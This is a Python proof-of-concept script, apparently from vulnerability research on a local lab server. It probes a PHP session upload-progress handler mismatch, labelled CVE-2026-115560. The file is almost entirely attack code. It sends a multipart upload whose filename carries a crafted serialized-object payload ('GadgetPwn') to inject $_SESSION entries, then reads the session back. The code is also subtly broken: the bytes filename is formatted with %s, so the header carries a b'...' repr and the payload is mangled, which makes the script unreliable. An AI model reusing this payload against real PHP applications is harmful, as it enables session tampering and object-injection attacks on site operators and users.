#!/usr/bin/env python3
"""up1: CVE-2026-115560 probe #1 — upload-progress write vs runtime-flipped read.

Theory: upload progress serializes progress data with the CONFIG handler
(php_binary) while the app reads $_SESSION with the RUNTIME handler (php).
The multipart filename is attacker bytes that land inside the serialized
progress record. If handlers desync, those bytes can inject $_SESSION keys
that the app-side parse turns into real session entries.

Stage A: fire multipart (progress name P, garbage file, crafted filename).
Stage B: re-GET target.php with the same SID, dump $_SESSION + raw sess file.
"""
import urllib.request, uuid, sys

HOST = "http://127.0.0.1:8086"
SID = uuid.uuid4().hex
P = "probe1"

def multipart(fields, files):
    b = "----up1" + uuid.uuid4().hex
    out = b""
    for k, v in fields.items():
        out += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n" % (b, k, v)).encode()
    for name, fname, data in files:
        out += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n" % (b, name, fname)).encode() + data + b"\r\n"
    out += ("--%s--\r\n" % b).encode()
    return out, "multipart/form-data; boundary=%s" % b

def post(path, fields, files):
    body, ctype = multipart(fields, files)
    req = urllib.request.Request(HOST + path, data=body, headers={
        "Content-Type": ctype,
        "Cookie": "PHPSESSID=" + SID,
    })
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return r.status, r.read()
    except Exception as e:
        return -1, ("ERR " + str(e)[:200]).encode()

def get(path):
    req = urllib.request.Request(HOST + path, headers={"Cookie": "PHPSESSID=" + SID})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return r.status, r.read()
    except Exception as e:
        return -1, ("ERR " + str(e)[:200]).encode()

# crafted filename: classic php-handler key injection
# "upload_progress_" + progress name is the key prefix upload progress uses;
# the filename bytes ride INSIDE the progress value.
evil = b'AAA|O:9:"GadgetPwn":0:{}BBBB'
st, body = post("/target.php",
    {"PHP_SESSION_UPLOAD_PROGRESS": P},
    [("f", evil, b"M" * 4096)])
print("A: post status", st, flush=True)
print("A: body", body[:300], flush=True)

st, body = get("/target.php")
print("B: readback status", st, flush=True)
print(body.decode("latin1", "replace"), flush=True)
